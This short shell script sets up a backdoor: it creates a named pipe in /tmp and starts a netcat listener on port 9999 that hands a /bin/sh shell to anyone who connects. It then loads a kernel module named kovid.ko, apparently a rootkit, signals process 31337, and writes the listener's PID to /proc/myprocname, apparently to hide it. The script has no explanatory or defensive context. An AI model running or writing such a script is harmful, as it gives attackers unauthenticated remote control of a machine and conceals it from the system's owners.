#!/bin/sh

PIPE="/tmp/backpipe"

# Clean up any existing pipe
rm -f "$PIPE"

# Create a named pipe
mkfifo "$PIPE"

# Start the backdoor listener using /bin/nc
echo "Starting backdoor listener on port 9999..."
(cat "$PIPE" | /bin/sh 2>&1 | /bin/nc -l 9999 > "$PIPE") &

NC_PID=$!

echo "PID of nc is $NC_PID"
echo "Backdoor listener started."

insmod kovid.ko
kill -CONT 31337

echo $NC_PID > /proc/myprocname
